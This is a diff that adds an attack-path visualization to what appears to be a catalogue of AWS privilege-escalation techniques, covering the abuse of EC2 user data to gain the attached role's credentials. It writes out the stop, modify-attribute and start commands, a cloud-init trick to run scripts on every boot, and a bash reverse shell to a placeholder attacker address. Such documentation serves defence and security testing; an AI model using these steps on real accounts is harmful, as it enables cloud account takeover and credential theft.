@@ -78,3 +78,124 @@ permissions:
     resourceConstraints: Target EC2 instance must be in the Resource section
   - permission: ec2:StartInstances
     resourceConstraints: Target EC2 instance must be in the Resource section
+attackVisualization:
+  nodes:
+    - id: start
+      label: starting-principal
+      type: principal
+      description: |
+        The principal with ec2:ModifyInstanceAttribute, ec2:StopInstances, and ec2:StartInstances permissions. Can be an IAM user or role. This principal will modify an existing EC2 instance's user data to inject a malicious script.
+
+    - id: target_instance
+      label: Target EC2 Instance
+      type: resource
+      description: |
+        An existing EC2 instance that has an IAM role attached via an instance profile. The attacker will modify this instance's user data to inject a reverse shell payload that executes on the next boot.
+
+    - id: attached_role
+      label: attached-role
+      type: resource
+      description: |
+        The IAM role already attached to the target EC2 instance. This role must have an instance profile and trust ec2.amazonaws.com. When the malicious user data script executes, it has access to this role's credentials via the instance metadata service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+    - id: reverse_shell
+      label: Reverse Shell Executes
+      type: action
+      color: '#99ccff'
+      description: |
+        The modified user data contains a malicious script with cloud-init configuration that forces the user data to run on every boot (not just the initial launch). The script establishes a reverse shell connection to an attacker-controlled server, providing remote access with the attached role's credentials.
+
+        The malicious user data uses cloud-init's multipart MIME format to configure `cloud_final_modules: [scripts-user, always]`, which forces the script to execute on subsequent boots rather than just the first boot.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The reverse shell successfully connected and the attached role has administrative permissions (AdministratorAccess or equivalent). The attacker now has full administrative access to the AWS account via the reverse shell with the role's credentials.
+
+    - id: some_perms
+      label: Check for Additional Access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        The reverse shell successfully connected and the attached role has some elevated permissions (but not full admin). This could provide access to sensitive data (S3, RDS, DynamoDB) or enable additional privilege escalation paths.
+
+    - id: no_access
+      label: Minimal Additional Access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        The reverse shell successfully connected, but the attached role only has minimal permissions. Limited usefulness for privilege escalation, though could still be useful for reconnaissance.
+
+  edges:
+    - from: start
+      to: target_instance
+      label: ec2:StopInstances
+      description: |
+        Stop the target EC2 instance. User data can only be modified while the instance is stopped.
+
+        Command:
+        ```bash
+        aws ec2 stop-instances --instance-ids $INSTANCE_ID
+        ```
+
+        Wait for the instance to reach the "stopped" state before proceeding.
+
+    - from: target_instance
+      to: target_instance
+      label: ec2:ModifyInstanceAttribute
+      description: |
+        Modify the instance's user data attribute with a malicious script. The script uses cloud-init multipart MIME format to configure the user data script to run on every boot (not just initial launch) by setting `cloud_final_modules: [scripts-user, always]`.
+
+        The payload includes a reverse shell that connects to an attacker-controlled server:
+        ```bash
+        aws ec2 modify-instance-attribute \
+          --instance-id "$INSTANCE_ID" \
+          --attribute userData \
+          --value "file://$TEXT_PATH"
+        ```
+
+        The TEXT_PATH contains base64-encoded multipart MIME with cloud-init configuration and a bash reverse shell: `bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1`
+
+    - from: target_instance
+      to: attached_role
+      label: ec2:StartInstances
+      description: |
+        Start the instance to trigger execution of the modified user data script.
+
+        Command:
+        ```bash
+        aws ec2 start-instances --instance-ids $INSTANCE_ID
+        ```
+
+        When the instance boots, cloud-init processes the malicious user data and executes the reverse shell script with access to the attached role's credentials.
+
+    - from: attached_role
+      to: reverse_shell
+      label: User data executes on boot
+      description: |
+        The instance boots and cloud-init processes the malicious user data. Because the user data was configured with `cloud_final_modules: [scripts-user, always]`, the script executes on this boot (not just the initial launch). The reverse shell connects to the attacker's listener, providing remote access with the attached role's credentials available via IMDS.
+
+    - from: reverse_shell
+      to: admin
+      label: If attached role has admin permissions
+      branch: A
+      condition: admin
+      description: |
+        If the attached role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account via the reverse shell connection. They can execute any AWS API calls using the role's credentials.
+
+    - from: reverse_shell
+      to: some_perms
+      label: If attached role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the attached role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include access to sensitive data stores (S3 buckets, RDS databases) or permissions that enable additional privilege escalation techniques.
+
+    - from: reverse_shell
+      to: no_access
+      label: If attached role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the attached role only has minimal permissions (like logs:PutLogEvents), the reverse shell provides limited value for privilege escalation. However, it could still be useful for reconnaissance or as part of a multi-step attack chain.
